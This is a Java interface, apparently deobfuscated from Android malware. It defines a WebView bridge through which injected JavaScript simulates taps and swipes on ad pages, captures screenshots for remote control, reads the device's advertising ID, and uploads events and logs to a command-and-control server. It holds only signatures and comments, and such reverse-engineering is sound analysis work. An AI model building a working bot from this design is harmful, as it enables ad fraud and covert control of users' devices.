package touch;

/**
 * JavaScript bridge interface exposing native Android methods to injected JavaScript code.
 * Implementations are registered with WebView via {@code addJavascriptInterface(this, "Android")}.
 *
 * The injected JS script calls these methods to:
 * - Simulate touch/scroll events on the WebView
 * - Capture screenshots for remote control
 * - Upload telemetry events and logs to the C&C server
 * - Manage configuration and timing state
 * - Control WebRTC signaling status
 *
 * All methods are annotated with @JavascriptInterface in the implementing class.
 *
 * Original obfuscated name: lIllIlIll1.IlIllIlllIllI1
 */
public interface WebViewBridge {

    /**
     * Simulates a tap/click at the given coordinates on the WebView.
     *
     * @param x X coordinate in WebView pixels
     * @param y Y coordinate in WebView pixels
     */
    void touch(float x, float y);

    /**
     * Simulates a scroll/swipe gesture from (startX, startY) to (endX, endY)
     * over the specified duration using a Bezier curve path.
     *
     * @param startX   starting X coordinate
     * @param startY   starting Y coordinate
     * @param endX     ending X coordinate
     * @param endY     ending Y coordinate
     * @param duration duration of the swipe in milliseconds
     * @return true if the scroll was started successfully, false if one is already in progress
     */
    boolean scroll(float startX, float startY, float endX, float endY, long duration);

    /**
     * Navigates the WebView back one page in history.
     */
    void back();

    /**
     * Signals that the current task/ad interaction is done.
     * Reports completion to the C&C server and triggers cleanup.
     *
     * @param result result string to report (may be null)
     */
    void done(String result);

    /**
     * Captures a screenshot of the current WebView content.
     *
     * @return Base64-encoded PNG image data, or empty string on failure
     */
    String screenshot();

    /**
     * Returns the current task configuration as a JSON string.
     *
     * @return JSON configuration string
     */
    String getConfig();

    /**
     * Updates the task configuration with new JSON data.
     *
     * @param configJson new configuration JSON string
     * @param extra      additional parameter (unused in base implementation)
     */
    void setConfig(String configJson, String extra);

    /**
     * Returns the Google Advertising ID (GAID) of the device.
     *
     * @return GAID string, or empty string if unavailable
     */
    String getGAID();

    /**
     * Returns the accumulated elapsed time for the current session.
     *
     * @return elapsed time in milliseconds
     */
    long getTime();

    /**
     * Sets the accumulated elapsed time for the current session.
     *
     * @param timeMs elapsed time in milliseconds
     */
    void setTime(long timeMs);

    /**
     * Checks whether WebRTC signaling is currently active.
     *
     * @return true if signaling is active
     */
    boolean isSignaling();

    /**
     * Updates the WebRTC signaling status.
     *
     * @param status new signaling status code
     */
    void updateSignalStatus(int status);

    /**
     * Queues a telemetry event string for batch upload to the C&C server.
     *
     * @param eventJson JSON-encoded event data
     */
    void upload_event(String eventJson);

    /**
     * Queues a log entry string for batch upload to the C&C server.
     *
     * @param logJson JSON-encoded log data
     */
    void upload_log(String logJson);

    /**
     * Logs a debug message from the injected JavaScript.
     *
     * @param message debug message string
     */
    void debugLog(String message);

    /**
     * Attempts to detect a close button on the current page.
     *
     * @return detection result (empty string in base implementation)
     */
    String detectCloseBtn();
}
